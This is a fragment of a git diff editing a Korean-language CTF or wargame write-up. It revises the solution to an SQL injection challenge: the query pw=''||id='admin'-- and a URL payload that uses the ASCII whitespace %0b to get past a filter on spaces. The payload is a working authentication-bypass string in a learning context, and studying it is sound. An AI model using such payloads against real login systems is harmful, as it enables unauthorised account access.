@@ -17,8 +17,9 @@ but. +는 공백문자로 제한됨
 => 아스키코드의 공백문자인 0b, 0c 이용
 ```
 ```
-해결 쿼리문: where id='guest' and pw=''||id='admin'--```
-### CERT <br> ?where id='guest' and pw=''||id='admin'--%0b'
+해결 쿼리문: where id='guest' and pw=''||id='admin'--
+```
+### CERT <br> ?pw='||id='admin'--%0b'
 
 ### 느낀점
 ```diff
